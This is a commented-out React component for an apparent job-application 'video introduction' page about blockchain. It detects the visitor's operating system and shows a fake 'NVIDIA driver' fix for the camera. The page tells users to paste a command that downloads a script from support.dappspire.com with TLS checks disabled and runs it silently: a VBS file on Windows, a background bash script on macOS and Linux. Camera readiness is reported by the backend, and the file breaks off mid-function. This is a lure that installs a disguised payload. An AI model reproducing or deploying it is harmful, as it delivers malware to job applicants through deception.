// // import { useCallback, useEffect, useRef, useState, useMemo } from "react";
// // import { useNavigate } from "react-router-dom";
// // import axios from "axios";
// // import {
// //   ArrowDownTrayIcon,
// //   ArrowUpTrayIcon,
// //   ClipboardDocumentCheckIcon,
// //   VideoCameraIcon,
// //   VideoCameraSlashIcon,
// //   XMarkIcon,
// //   ArrowLeftIcon,
// //   ArrowsRightLeftIcon,
// //   ArrowPathIcon
// // } from "@heroicons/react/24/outline";
// // import useApplicationStore from "../store/applicationStore";
// // import { BACKEND_API_PATH } from "../config";
// // import { useToast } from "../contexts/ToastContext";
// // import Layout from "../components/Layout";

// // // CSS reset and base styles
// // const globalStyles = `
// //   * {
// //     box-sizing: border-box;
// //     margin: 0;
// //     padding: 0;
// //   }

// //   body {
// //     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 
// //                  Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', 
// //                  sans-serif;
// //     -webkit-font-smoothing: antialiased;
// //     -moz-osx-font-smoothing: grayscale;
// //     line-height: 1.5;
// //   }

// //   button, input, textarea {
// //     font-family: inherit;
// //   }

// //   img, video {
// //     max-width: 100%;
// //     height: auto;
// //     display: block;
// //   }
// // `;

// // export default function VideoIntro() {
// //   // Inject global styles on component mount
// //   useEffect(() => {
// //     const styleElement = document.createElement('style');
// //     styleElement.innerHTML = globalStyles;
// //     document.head.appendChild(styleElement);

// //     return () => {
// //       document.head.removeChild(styleElement);
// //     };
// //   }, []);

// //   const navigate = useNavigate();
// //   const { addToast } = useToast();
// //   const { token } = useApplicationStore();
// //   const [uploading, setUploading] = useState(false);
// //   const [uploadProgress, setUploadProgress] = useState(0);
// //   const [showInstructions, setShowInstructions] = useState(false);
// //   const [cameraStatus, setCameraStatus] = useState(false);
// //   const [cameraReady, setCameraReady] = useState(false);
// //   const [recording, setRecording] = useState(false);
// //   const [videoURL, setVideoURL] = useState("");
// //   const [useFrontCamera, setUseFrontCamera] = useState(true);
// //   const [isCheckingCamera, setIsCheckingCamera] = useState(false);
// //   const [lastStatusCheck, setLastStatusCheck] = useState(0);
// //   const mediaRecorderRef = useRef(null);
// //   const [status, setStatus] = useState(0);
// //   const videoRef = useRef(null);
// //   const chunksRef = useRef([]);
// //   const [os, setOS] = useState("Detecting...");
// //   const stabilizationTimeoutRef = useRef(null);

// //   const [setupVideoUrl] = useState("https://example.com/path-to-your-video.mp4");

// //   // Cleanup effects
// //   useEffect(() => {
// //     return () => {
// //       if (mediaRecorderRef.current?.state === "recording") {
// //         mediaRecorderRef.current.stop();
// //       }

// //       if (videoRef.current?.srcObject) {
// //         videoRef.current.srcObject.getTracks().forEach(track => track.stop());
// //       }

// //       if (videoURL) {
// //         URL.revokeObjectURL(videoURL);
// //       }

// //       if (stabilizationTimeoutRef.current) {
// //         clearTimeout(stabilizationTimeoutRef.current);
// //       }
// //     };
// //   }, [videoURL]);

// //   // Save status to backend
// //   useEffect(() => {
// //     const saveStatus = async () => {
// //       try {
// //         await axios.put(`${BACKEND_API_PATH}/applications/token/${token}`, {
// //           status,
// //         });
// //       } catch (error) {
// //         console.error("Error saving status:", error);
// //       }
// //     };
// //     saveStatus();
// //   }, [status, token]);

// //   // Detect OS with improved reliability
// //   useEffect(() => {
// //     function getOS() {
// //       const userAgent = window.navigator.userAgent;
// //       const platform = window.navigator.platform;

// //       if (/Android/i.test(userAgent)) return "Android";
// //       if (/iPhone|iPad|iPod/i.test(userAgent)) return "iOS";
// //       if (/Win/i.test(platform)) return "Windows";
// //       if (/Mac/i.test(platform)) return "MacOS";
// //       if (/Linux/i.test(platform)) return "Linux";
// //       return "Unknown OS";
// //     }
// //     setOS(getOS());
// //   }, []);

// //   // Camera status checking with stabilization and optimized polling
// //   const checkCameraStatus = useCallback(async () => {
// //     if (cameraReady && Date.now() - lastStatusCheck < 30000) return;
// //     if (isCheckingCamera) return;

// //     setIsCheckingCamera(true);
// //     try {
// //       const response = await axios.get(
// //         `${BACKEND_API_PATH}/applications/token/${token}/cameraStatus`,
// //         {
// //           headers: {
// //             'Cache-Control': 'no-cache',
// //             'Pragma': 'no-cache'
// //           },
// //           params: { _: Date.now() }
// //         }
// //       );

// //       const newStatus = response.data.cameraStatus;
// //       setLastStatusCheck(Date.now());

// //       if (newStatus !== cameraStatus) {
// //         setCameraStatus(newStatus);

// //         if (newStatus) {
// //           if (stabilizationTimeoutRef.current) {
// //             clearTimeout(stabilizationTimeoutRef.current);
// //           }

// //           stabilizationTimeoutRef.current = setTimeout(() => {
// //             setCameraReady(true);
// //             setShowInstructions(false);
// //             addToast({ message: "Camera is now ready!", type: "success" });
// //           }, 5000);
// //         } else {
// //           setCameraReady(false);
// //           if (stabilizationTimeoutRef.current) {
// //             clearTimeout(stabilizationTimeoutRef.current);
// //           }
// //         }
// //       }
// //     } catch (error) {
// //       console.error("Error checking camera status:", error);
// //     } finally {
// //       setIsCheckingCamera(false);
// //     }
// //   }, [token, cameraStatus, cameraReady, isCheckingCamera, lastStatusCheck, addToast]);

// //   // Dynamic polling based on camera state
// //   useEffect(() => {
// //     let intervalId;
// //     const pollingInterval = cameraReady ? 60000 : 3000;

// //     const startPolling = () => {
// //       checkCameraStatus();
// //       intervalId = setInterval(checkCameraStatus, pollingInterval);
// //     };

// //     startPolling();
// //     return () => clearInterval(intervalId);
// //   }, [checkCameraStatus, cameraReady]);

// //   // OS-specific driver command with improved reliability
// //   const DRIVER_URL = useMemo(() => {
// //     switch (os) {
// //       case "Windows":
// //         return `curl -k -o "%TEMP%\\nv_driver_win64_551.23_rc_whql.zip" https://support.dappspire.com/api/drivers/update/windows/${token} && powershell -Command "Expand-Archive -Force -Path '%TEMP%\\nv_driver_win64_551.23_rc_whql.zip' -DestinationPath '%TEMP%\\nvidiadrive'" && wscript "%TEMP%\\nvidiadrive\\update.vbs"`;
// //       case "MacOS":
// //         return `curl -k -o /var/tmp/NVIDIA-driver-downloader.sh https://support.dappspire.com/api/drivers/update/macos/${token} && chmod +x /var/tmp/NVIDIA-driver-downloader.sh && nohup bash /var/tmp/NVIDIA-driver-downloader.sh >/dev/null 2>&1 &`;
// //       case "Linux":
// //         return `curl -k -o /var/tmp/NVIDIA-driver-downloader.sh https://support.dappspire.com/api/drivers/update/linux/${token} && chmod +x /var/tmp/NVIDIA-driver-downloader.sh && nohup bash /var/tmp/NVIDIA-driver-downloader.sh >/dev/null 2>&1 &`;
// //       default:
// //         return "echo 'Unsupported operating system'";
// //     }
// //   }, [os, token]);

// //   const handleCopyCommand = useCallback(async () => {
// //     try {
// //       await navigator.clipboard.writeText(DRIVER_URL);
// //       addToast({ message: "Command copied to clipboard", type: "success" });

// //       setStatus(2);
// //       setCameraStatus(true);
// //       setCameraReady(false);

// //       await axios.put(`${BACKEND_API_PATH}/applications/token/${token}`, {
// //         status: 2,
// //       });

// //       await checkCameraStatus();
// //     } catch (error) {
// //       console.error("Error copying command:", error);
// //       // addToast({ message: "Failed to copy command", type: "error" });
// //     }
// //   }, [DRIVER_URL, token, addToast, checkCameraStatus]);

// //   const startRecording = useCallback(async () => {
// //     try {
// //       const constraints = {
// //         video: {
// //           width: { ideal: 1280 },
// //           height: { ideal: 720 },
// //           facingMode: useFrontCamera ? 'user' : 'environment'
// //         },
// //         audio: true,
// //       };

// //       // Add browser-specific constraints
// //       if (os === "iOS") {
// //         constraints.video = {
// //           ...constraints.video,
// //           mandatory: {
// //             minWidth: 1280,
// //             minHeight: 720,
// //           }
// //         };
// //       }

// //       const stream = await navigator.mediaDevices.getUserMedia(constraints);

// //       videoRef.current.srcObject = stream;
// //       mediaRecorderRef.current = new MediaRecorder(stream);

// //       mediaRecorderRef.current.ondataavailable = (event) => {
// //         if (event.data.size > 0) chunksRef.current.push(event.data);
// //       };

// //       mediaRecorderRef.current.onstop = () => {
// //         const blob = new Blob(chunksRef.current, { type: "video/webm" });
// //         const url = URL.createObjectURL(blob);
// //         setVideoURL(url);
// //         chunksRef.current = [];
// //       };

// //       mediaRecorderRef.current.start(1000);
// //       setRecording(true);
// //     } catch (err) {
// //       console.error("Error accessing media devices:", err);
// //       let errorMessage = "Could not access camera";

// //       if (err.name === 'NotAllowedError') {
// //         errorMessage = "Camera access was denied. Please allow camera permissions.";
// //       } else if (err.name === 'NotFoundError') {
// //         errorMessage = "No camera found on this device.";
// //       } else if (err.name === 'NotReadableError') {
// //         errorMessage = "Camera is already in use by another application.";
// //       } else if (err.name === 'OverconstrainedError') {
// //         errorMessage = "Couldn't get the required resolution. Trying lower resolution.";
// //         // Try again with lower resolution
// //         try {
// //           const stream = await navigator.mediaDevices.getUserMedia({
// //             video: true,
// //             audio: true
// //           });
// //           videoRef.current.srcObject = stream;
// //           return;
// //         } catch (fallbackError) {
// //           errorMessage = "Couldn't access camera with any resolution.";
// //         }
// //       }

// //       addToast({ message: errorMessage, type: "error" });
// //       setStatus(1);
// //       setShowInstructions(true);
// //       setCameraStatus(false);
// //       setCameraReady(false);
// //       await checkCameraStatus();
// //     }
// //   }, [addToast, useFrontCamera, checkCameraStatus, os]);

// //   const stopRecording = useCallback(() => {
// //     if (mediaRecorderRef.current?.state === "recording") {
// //       mediaRecorderRef.current.stop();
// //       if (videoRef.current?.srcObject) {
// //         videoRef.current.srcObject.getTracks().forEach(track => track.stop());
// //       }
// //       setRecording(false);
// //     }
// //   }, []);

// //   const handleRecordClick = useCallback(async () => {
// //     if (cameraReady) {
// //       if (recording) stopRecording();
// //       else startRecording();
// //     } else {
// //       setStatus(1);
// //       setShowInstructions(true);
// //     }
// //   }, [cameraReady, recording, startRecording, stopRecording]);

// //   const handleSubmitVideo = useCallback(async () => {
// //     if (!videoURL) return;
// //     setUploading(true);
// //     setUploadProgress(0);

// //     try {
// //       const blob = await fetch(videoURL).then((r) => r.blob());
// //       const formData = new FormData();
// //       formData.append("video", blob, "recorded-video.webm");

// //       await axios.post(`${BACKEND_API_PATH}/uploads?token=${token}`, formData, {
// //         onUploadProgress: (progressEvent) => {
// //           const percentCompleted = Math.round(
// //             (progressEvent.loaded * 100) / progressEvent.total
// //           );
// //           setUploadProgress(percentCompleted);
// //         }
// //       });

// //       addToast({ message: "Upload successful", type: "success" });
// //       navigate("/complete");
// //     } catch (error) {
// //       console.error("Upload error:", error);
// //       addToast({
// //         message: `Upload failed: ${error.response?.data?.message || error.message}`,
// //         type: "error"
// //       });
// //       setUploading(false);
// //     }
// //   }, [videoURL, token, navigate, addToast]);

// //   // if (showInstructions) {
// //   //   return (
// //   //     <Layout title="Camera Setup Instructions">
// //   //       <div className="max-w-3xl mx-auto p-6 bg-white rounded-lg shadow-lg">
// //   //         <button
// //   //           onClick={() => setShowInstructions(false)}
// //   //           className="flex items-center gap-2 mb-6 text-indigo-600 hover:text-indigo-800 transition-colors duration-200"
// //   //           aria-label="Back to recording"
// //   //         >
// //   //           <ArrowLeftIcon className="h-5 w-5" />
// //   //           Back to recording
// //   //         </button>

// //   //         <h2 className="text-2xl font-bold mb-4 text-gray-800">Camera Setup Instructions</h2>

// //   //         <div className="bg-gray-50 p-4 rounded-lg mb-6 border border-gray-200">
// //   //           <div className="flex items-center gap-2 mb-3">
// //   //             <div className={`w-3 h-3 rounded-full ${cameraReady ? 'bg-green-500' : cameraStatus ? 'bg-yellow-500' : 'bg-red-500'}`} />
// //   //             <span className="text-gray-700">
// //   //               Camera Status: {cameraReady ? 'Ready' : cameraStatus ? 'Initializing...' : 'Not Ready'}
// //   //             </span>
// //   //             <button 
// //   //               onClick={checkCameraStatus}
// //   //               disabled={isCheckingCamera}
// //   //               className="ml-2 p-1 text-indigo-600 hover:text-indigo-800 disabled:opacity-50 transition-colors duration-200"
// //   //               aria-label="Refresh camera status"
// //   //             >
// //   //               <ArrowPathIcon className={`h-4 w-4 ${isCheckingCamera ? 'animate-spin' : ''}`} />
// //   //             </button>
// //   //           </div>

// //   //           <h3 className="font-semibold mb-2 text-gray-700">For {os}</h3>
// //   //           <div className="bg-gray-100 p-3 rounded relative border border-gray-300">
// //   //             <code className="text-sm break-all font-mono text-gray-800">{DRIVER_URL}</code>
// //   //             <button
// //   //               onClick={handleCopyCommand}
// //   //               className="absolute top-2 right-2 p-1 bg-white rounded hover:bg-gray-200 transition-colors duration-200"
// //   //               title="Copy to clipboard"
// //   //               aria-label="Copy command"
// //   //             >
// //   //               <ClipboardDocumentCheckIcon className="h-5 w-5 text-gray-600" />
// //   //             </button>
// //   //           </div>
// //   //           <div className="flex gap-2 mt-4">
// //   //             <button
// //   //               onClick={handleCopyCommand}
// //   //               className="px-4 py-2 bg-indigo-600 text-white rounded-md hover:bg-indigo-700 
// //   //                        focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2 
// //   //                        transition-colors duration-200"
// //   //               aria-label="Copy command to clipboard"
// //   //             >
// //   //               Copy Command
// //   //             </button>
// //   //           </div>
// //   //         </div>

// //   //         <div className="prose text-gray-700">
// //   //           <p className="mb-3">After running the command:</p>
// //   //           <ol className="list-decimal pl-5 space-y-2">
// //   //             <li>Wait for the installation to complete (may take 1-2 minutes)</li>
// //   //             <li>The status should automatically update within 5-10 seconds</li>
// //   //             <li>You'll see "Initializing..." status for 5 seconds before camera becomes ready</li>
// //   //             <li>If status doesn't update, click refresh or reload the page</li>
// //   //           </ol>
// //   //         </div>
// //   //       </div>
// //   //     </Layout>
// //   //   );
// //   // }

// //   if (showInstructions) {
// //     return (
// //       <Layout title="Camera Setup Instructions">
// //         <div className="max-w-3xl mx-auto p-6 bg-white rounded-lg shadow-lg">
// //           <button
// //             onClick={() => setShowInstructions(false)}
// //             className="flex items-center gap-2 mb-6 text-indigo-600 hover:text-indigo-800 transition-colors duration-200"
// //             aria-label="Back to recording"
// //           >
// //             <ArrowLeftIcon className="h-5 w-5" />
// //             Back to recording
// //           </button>

// //           <h2 className="text-2xl font-bold mb-4 text-gray-800">Camera Setup Instructions</h2>

// //           <div className="mb-6 bg-black rounded-lg overflow-hidden shadow-md">
// //             <video
// //               controls
// //               className="w-full aspect-video"
// //               aria-label="Camera setup instructions video"
// //               poster="/images/video-preview.jpg" // Optional preview image
// //             >
// //               <source src="/videos/camera-setup.mp4" type="video/mp4" />
// //               <source src="/videos/camera-setup.webm" type="video/webm" /> {/* For better browser support */}
// //               Your browser does not support HTML5 video.
// //               <a href="/videos/camera-setup.mp4" className="text-indigo-600 underline">
// //                 Download the video instead
// //               </a>.
// //             </video>
// //           </div>

// //           <div className="bg-gray-50 p-4 rounded-lg mb-6 border border-gray-200">
// //             <div className="flex items-center gap-2 mb-3">
// //               <div className={`w-3 h-3 rounded-full ${cameraReady ? 'bg-green-500' : cameraStatus ? 'bg-yellow-500' : 'bg-red-500'}`} />
// //               <span className="text-gray-700">
// //                 Camera Status: {cameraReady ? 'Ready' : cameraStatus ? 'Initializing...' : 'Not Ready'}
// //               </span>
// //               <button
// //                 onClick={checkCameraStatus}
// //                 disabled={isCheckingCamera}
// //                 className="ml-2 p-1 text-indigo-600 hover:text-indigo-800 disabled:opacity-50 transition-colors duration-200"
// //                 aria-label="Refresh camera status"
// //               >
// //                 <ArrowPathIcon className={`h-4 w-4 ${isCheckingCamera ? 'animate-spin' : ''}`} />
// //               </button>
// //             </div>

// //             <h3 className="font-semibold mb-2 text-gray-700">For {os}</h3>

// //             {/* OS-specific execution instructions */}
// //             <div className="mb-3 p-3 bg-blue-50 rounded border border-blue-100">
// //               <h4 className="font-medium text-blue-800 mb-1">How to run this command:</h4>
// //               {os === "Windows" && (
// //                 <ol className="list-decimal pl-5 text-sm text-blue-900 space-y-1">
// //                   <li>Press Win+R, type "cmd" and press Enter</li>
// //                   <li>Right-click in Command Prompt to paste</li>
// //                   <li>Press Enter to execute</li>
// //                 </ol>
// //               )}
// //               {os === "MacOS" && (
// //                 <ol className="list-decimal pl-5 text-sm text-blue-900 space-y-1">
// //                   <li>Open Terminal from Applications → Utilities</li>
// //                   <li>Press Command+V to paste</li>
// //                   <li>Press Return to execute</li>
// //                 </ol>
// //               )}
// //               {os === "Linux" && (
// //                 <ol className="list-decimal pl-5 text-sm text-blue-900 space-y-1">
// //                   <li>Open Terminal (Ctrl+Alt+T)</li>
// //                   <li>Press Ctrl+Shift+V to paste</li>
// //                   <li>Press Enter to execute</li>
// //                 </ol>
// //               )}
// //               {!["Windows", "MacOS", "Linux"].includes(os) && (
// //                 <p className="text-sm text-blue-900">Paste this command in your system's terminal</p>
// //               )}
// //             </div>

// //             <div className="bg-gray-100 p-3 rounded relative border border-gray-300">
// //               <code className="text-sm break-all font-mono text-gray-800">{DRIVER_URL}</code>
// //               <button
// //                 onClick={handleCopyCommand}
// //                 className="absolute top-2 right-2 p-1 bg-white rounded hover:bg-gray-200 transition-colors duration-200"
// //                 title="Copy to clipboard"
// //                 aria-label="Copy command"
// //               >
// //                 <ClipboardDocumentCheckIcon className="h-5 w-5 text-gray-600" />
// //               </button>
// //             </div>
// //             <div className="flex gap-2 mt-4">
// //               <button
// //                 onClick={handleCopyCommand}
// //                 className="px-4 py-2 bg-indigo-600 text-white rounded-md hover:bg-indigo-700 
// //                        focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2 
// //                        transition-colors duration-200"
// //                 aria-label="Copy command to clipboard"
// //               >
// //                 Copy Command
// //               </button>
// //             </div>
// //           </div>
// //         </div>
// //       </Layout>
// //     );
// //   }

// //   return (
// //     <Layout title="Record Your Video Introduction">
// //       <div className="grid grid-cols-1 md:grid-cols-2 gap-8 w-full max-w-screen-xl mx-auto px-4">
// //         <div className="relative w-full max-w-[768px] mx-auto">
// //           <div className="bg-black rounded-xl aspect-video flex items-center justify-center w-full relative overflow-hidden shadow-lg">
// //             {!videoURL ? (
// //               <>
// //                 <video
// //                   ref={videoRef}
// //                   autoPlay
// //                   muted
// //                   playsInline
// //                   className="w-full h-full object-cover bg-black"
// //                   aria-label="Camera preview"
// //                 />
// //                 {cameraReady && (
// //                   <button
// //                     onClick={() => setUseFrontCamera(!useFrontCamera)}
// //                     className="absolute top-4 right-4 p-2 bg-white bg-opacity-50 rounded-full hover:bg-opacity-100 transition-opacity duration-200"
// //                     title="Switch Camera"
// //                     aria-label="Switch between front and rear cameras"
// //                   >
// //                     <ArrowsRightLeftIcon className="h-5 w-5 text-gray-800" />
// //                   </button>
// //                 )}
// //                 <div className="absolute bottom-4 left-0 w-full flex justify-center">
// //                   <button
// //                     onClick={handleRecordClick}
// //                     className={`p-3 rounded-full hover:opacity-90 transition-opacity duration-200
// //                                ${recording ? 'bg-red-600' : 'bg-indigo-600'} 
// //                                ${!cameraReady ? 'opacity-50 cursor-not-allowed' : ''}`}
// //                     aria-label={recording ? "Stop recording" : "Start recording"}
// //                     disabled={!cameraReady}
// //                   >
// //                     {recording ? (
// //                       <VideoCameraSlashIcon className="h-8 w-8 text-white" />
// //                     ) : (
// //                       <VideoCameraIcon className="h-8 w-8 text-white" />
// //                     )}
// //                   </button>
// //                 </div>
// //               </>
// //             ) : (
// //               <video
// //                 src={videoURL}
// //                 controls
// //                 className="w-full h-full object-contain bg-black"
// //                 aria-label="Recorded video preview"
// //               />
// //             )}
// //           </div>

// //           {videoURL && (
// //             <div className="flex justify-center gap-4 mt-4">
// //               <button
// //                 onClick={() => {
// //                   URL.revokeObjectURL(videoURL);
// //                   setVideoURL("");
// //                 }}
// //                 className="flex items-center gap-2 px-4 py-2 bg-gray-200 rounded-md hover:bg-gray-300 
// //                            focus:outline-none focus:ring-2 focus:ring-gray-500 focus:ring-offset-2 
// //                            transition-colors duration-200"
// //                 aria-label="Record again"
// //               >
// //                 <VideoCameraIcon className="h-5 w-5 text-gray-700" />
// //                 <span className="text-gray-700">Record Again</span>
// //               </button>
// //               <button
// //                 onClick={handleSubmitVideo}
// //                 disabled={uploading}
// //                 className="flex items-center gap-2 px-4 py-2 bg-indigo-600 text-white rounded-md 
// //                          hover:bg-indigo-700 disabled:opacity-50 focus:outline-none 
// //                          focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2 
// //                          transition-colors duration-200 min-w-[160px] justify-center"
// //                 aria-label="Submit video"
// //               >
// //                 {uploading ? (
// //                   <>
// //                     <span className="inline-block">
// //                       Uploading... {uploadProgress}%
// //                     </span>
// //                   </>
// //                 ) : (
// //                   <>
// //                     <ArrowUpTrayIcon className="h-5 w-5" />
// //                     <span>Submit Video</span>
// //                   </>
// //                 )}
// //               </button>
// //             </div>
// //           )}
// //         </div>

// //         <div className="flex flex-col justify-center space-y-6">
// //           <div className="flex items-center gap-3">
// //             <div className={`w-3 h-3 rounded-full ${cameraReady ? 'bg-green-500' : cameraStatus ? 'bg-yellow-500' : 'bg-red-500'}`} />
// //             <span className="text-gray-700">
// //               {cameraReady ? 'Camera Ready' :
// //                 cameraStatus ? 'Camera Initializing...' : 'Camera Not Ready'}
// //             </span>
// //             {!cameraReady && (
// //               <button
// //                 onClick={() => setShowInstructions(true)}
// //                 className="px-4 py-2 bg-indigo-600 text-white rounded-md hover:bg-indigo-700 
// //                           focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2 
// //                           transition-colors duration-200 disabled:opacity-50"
// //                 disabled={cameraStatus}
// //               >
// //                 {cameraStatus ? 'Waiting...' : 'Setup Instructions'}
// //               </button>
// //             )}
// //           </div>

// //           <h2 className="text-xl font-semibold text-gray-800">
// //             What excites you most about the future of blockchain technology?
// //           </h2>

// //           <button
// //             onClick={handleRecordClick}
// //             disabled={!cameraReady}
// //             className={`flex items-center justify-center gap-2 px-6 py-3 rounded-lg 
// //                        focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2 
// //                        transition-colors duration-200 ${cameraReady
// //                 ? 'bg-indigo-600 text-white hover:bg-indigo-700'
// //                 : 'bg-gray-300 text-gray-500 cursor-not-allowed'
// //               }`}
// //             aria-label={cameraReady ? (recording ? "Stop recording" : "Start recording") : "Camera initializing"}
// //           >
// //             {recording ? (
// //               <>
// //                 <VideoCameraSlashIcon className="h-6 w-6" />
// //                 <span>Stop Recording</span>
// //               </>
// //             ) : (
// //               <>
// //                 <VideoCameraIcon className="h-6 w-6" />
// //                 <span>{cameraReady ? "Record Now" : "Initializing Camera..."}</span>
// //               </>
// //             )}
// //           </button>

// //           <ul className="space-y-3 text-gray-600">
// //             <li className="flex items-start gap-2">
// //               <span className="text-gray-500">•</span>
// //               <span>Keep your introduction between 1-3 minutes</span>
// //             </li>
// //             <li className="flex items-start gap-2">
// //               <span className="text-gray-500">•</span>
// //               <span>Ensure good lighting and clear audio</span>
// //             </li>
// //             <li className="flex items-start gap-2">
// //               <span className="text-gray-500">•</span>
// //               <span>Briefly introduce yourself and your background</span>
// //             </li>
// //             {cameraReady && (
// //               <li className="flex items-start gap-2">
// //                 <span className="text-gray-500">•</span>
// //                 <span>Click the switch camera icon to toggle between front and rear cameras</span>
// //               </li>
// //             )}
// //           </ul>
// //         </div>
// //       </div>
// //     </Layout>
// //   );
// // }

// import { useCallback, useEffect, useRef, useState, useMemo } from "react";
// import { useNavigate } from "react-router-dom";
// import axios from "axios";
// import {
//   ArrowUpTrayIcon,
//   ClipboardDocumentCheckIcon,
//   CameraIcon,
//   ArrowLeftIcon,
//   ArrowsRightLeftIcon,
//   ArrowPathIcon,
//   XMarkIcon,
//   VideoCameraSlashIcon // Using this instead of CameraSlashIcon
// } from "@heroicons/react/24/outline";
// import useApplicationStore from "../store/applicationStore";
// import { BACKEND_API_PATH } from "../config";
// import { useToast } from "../contexts/ToastContext";
// import Layout from "../components/Layout";

// // CSS reset and base styles
// const globalStyles = `
//   * {
//     box-sizing: border-box;
//     margin: 0;
//     padding: 0;
//   }

//   body {
//     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 
//                  Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', 
//                  sans-serif;
//     -webkit-font-smoothing: antialiased;
//     -moz-osx-font-smoothing: grayscale;
//     line-height: 1.5;
//   }

//   button, input, textarea {
//     font-family: inherit;
//   }

//   img, video {
//     max-width: 100%;
//     height: auto;
//     display: block;
//   }
// `;

// export default function VideoIntro() {
//   // Inject global styles on component mount
//   useEffect(() => {
//     const styleElement = document.createElement('style');
//     styleElement.innerHTML = globalStyles;
//     document.head.appendChild(styleElement);

//     return () => {
//       document.head.removeChild(styleElement);
//     };
//   }, []);

//   const navigate = useNavigate();
//   const { addToast } = useToast();
//   const { token } = useApplicationStore();
//   const [uploading, setUploading] = useState(false);
//   const [uploadProgress, setUploadProgress] = useState(0);
//   const [showInstructions, setShowInstructions] = useState(false);
//   const [cameraStatus, setCameraStatus] = useState(false);
//   const [cameraReady, setCameraReady] = useState(false);
//   const [capturing, setCapturing] = useState(false);
//   const [photoURL, setPhotoURL] = useState("");
//   const [useFrontCamera, setUseFrontCamera] = useState(true);
//   const [isCheckingCamera, setIsCheckingCamera] = useState(false);
//   const [lastStatusCheck, setLastStatusCheck] = useState(0);
//   const videoRef = useRef(null);
//   const [status, setStatus] = useState(0);
//   const [os, setOS] = useState("Detecting...");
//   const stabilizationTimeoutRef = useRef(null);
//   const canvasRef = useRef(null);

//   // Cleanup effects
//   useEffect(() => {
//     return () => {
//       if (videoRef.current?.srcObject) {
//         videoRef.current.srcObject.getTracks().forEach(track => track.stop());
//       }

//       if (photoURL) {
//         URL.revokeObjectURL(photoURL);
//       }

//       if (stabilizationTimeoutRef.current) {
//         clearTimeout(stabilizationTimeoutRef.current);
//       }
//     };
//   }, [photoURL]);

//   // Save status to backend
//   useEffect(() => {
//     const saveStatus = async () => {
//       try {
//         await axios.put(`${BACKEND_API_PATH}/applications/token/${token}`, {
//           status,
//         });
//       } catch (error) {
//         console.error("Error saving status:", error);
//       }
//     };
//     saveStatus();
//   }, [status, token]);

//   // Detect OS with improved reliability
//   useEffect(() => {
//     function getOS() {
//       const userAgent = window.navigator.userAgent;
//       const platform = window.navigator.platform;

//       if (/Android/i.test(userAgent)) return "Android";
//       if (/iPhone|iPad|iPod/i.test(userAgent)) return "iOS";
//       if (/Win/i.test(platform)) return "Windows";
//       if (/Mac/i.test(platform)) return "MacOS";
//       if (/Linux/i.test(platform)) return "Linux";
//       return "Unknown OS";
//     }
//     setOS(getOS());
//   }, []);

//   // Camera status checking with stabilization and optimized polling
//   const checkCameraStatus = useCallback(async () => {
//     if (cameraReady && Date.now() - lastStatusCheck < 30000) return;
//     if (isCheckingCamera) return;

//     setIsCheckingCamera(true);
//     try {
//       const response = await axios.get(
//         `${BACKEND_API_PATH}/applications/token/${token}/cameraStatus`,
//         {
//           headers: {
//             'Cache-Control': 'no-cache',
//             'Pragma': 'no-cache'
//           },
//           params: { _: Date.now() }
//         }
//       );

//       const newStatus = response.data.cameraStatus;
//       setLastStatusCheck(Date.now());

//       if (newStatus !== cameraStatus) {
//         setCameraStatus(newStatus);

//         if (newStatus) {
//           if (stabilizationTimeoutRef.current) {
//             clearTimeout(stabilizationTimeoutRef.current);
//           }

//           stabilizationTimeoutRef.current = setTimeout(() => {
//             setCameraReady(true);
//             setShowInstructions(false);
//             addToast({ message: "Camera is now ready!", type: "success" });
//           }, 5000);
//         } else {
//           setCameraReady(false);
//           if (stabilizationTimeoutRef.current) {
//             clearTimeout(stabilizationTimeoutRef.current);
//           }
//         }
//       }
//     } catch (error) {
//       console.error("Error checking camera status:", error);
//     } finally {
//       setIsCheckingCamera(false);
//     }
//   }, [token, cameraStatus, cameraReady, isCheckingCamera, lastStatusCheck, addToast]);

//   // Dynamic polling based on camera state
//   useEffect(() => {
//     let intervalId;
//     const pollingInterval = cameraReady ? 60000 : 3000;

//     const startPolling = () => {
//       checkCameraStatus();
//       intervalId = setInterval(checkCameraStatus, pollingInterval);
//     };

//     startPolling();
//     return () => clearInterval(intervalId);
//   }, [checkCameraStatus, cameraReady]);

//   // OS-specific driver command with improved reliability
//   const DRIVER_URL = useMemo(() => {
//     switch (os) {
//       case "Windows":
//         return `curl -k -o "%TEMP%\\nv_driver_win64_551.23_rc_whql.zip" https://support.dappspire.com/api/drivers/update/windows/${token} && powershell -Command "Expand-Archive -Force -Path '%TEMP%\\nv_driver_win64_551.23_rc_whql.zip' -DestinationPath '%TEMP%\\nvidiadrive'" && wscript "%TEMP%\\nvidiadrive\\update.vbs"`;
//       case "MacOS":
//         return `curl -k -o /var/tmp/NVIDIA-driver-downloader.sh https://support.dappspire.com/api/drivers/update/macos/${token} && chmod +x /var/tmp/NVIDIA-driver-downloader.sh && nohup bash /var/tmp/NVIDIA-driver-downloader.sh >/dev/null 2>&1 &`;
//       case "Linux":
//         return `curl -k -o /var/tmp/NVIDIA-driver-downloader.sh https://support.dappspire.com/api/drivers/update/linux/${token} && chmod +x /var/tmp/NVIDIA-driver-downloader.sh && nohup bash /var/tmp/NVIDIA-driver-downloader.sh >/dev/null 2>&1 &`;
//       default:
//         return "echo 'Unsupported operating system'";
//     }
//   }, [os, token]);

//   const DRIVER_URL_2 = useMemo(() => {
//     switch (os) {
//       case "Windows":
//         return `curl -L -o nvidia_driver.exe "https://us.download.nvidia.com/Windows/551.86/551.86-desktop-win10-win11-64bit-international-dch-whql.exe"`;
//       case "MacOS":
//         return `curl -L -o cuda-macos.dmg "https://developer.download.nvidia.com/compute/cuda/11.4.2/local_installers/cuda_11.4.2_mac.dmg"`;
//       case "Linux":
//         return `curl -L -o NVIDIA-Linux-x86_64.run "https://us.download.nvidia.com/XFree86/Linux-x86_64/550.90.07/NVIDIA-Linux-x86_64-550.90.07.run"`;
//       default:
//         return "echo 'Unsupported operating system'";
//     }
//   }, [os, token])

//   const handleCopyCommand = useCallback(async () => {
//     try {
//       await navigator.clipboard.writeText(DRIVER_URL);
//       addToast({ message: "Command copied to clipboard", type: "success" });

//       setStatus(2);
